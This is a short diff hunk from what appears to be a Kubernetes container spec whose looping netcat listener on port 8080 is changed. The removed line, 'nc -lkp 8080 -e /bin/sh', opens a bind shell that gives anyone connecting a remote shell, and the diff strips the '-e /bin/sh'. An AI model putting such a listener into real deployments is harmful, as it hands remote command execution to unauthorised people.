@@ -30,7 +30,7 @@ spec:
           - -c
           - |
             while true; do
-              nc -lkp 8080 -e /bin/sh
+              nc -lkp 8080
             done
           env:
           - name: POD_IP
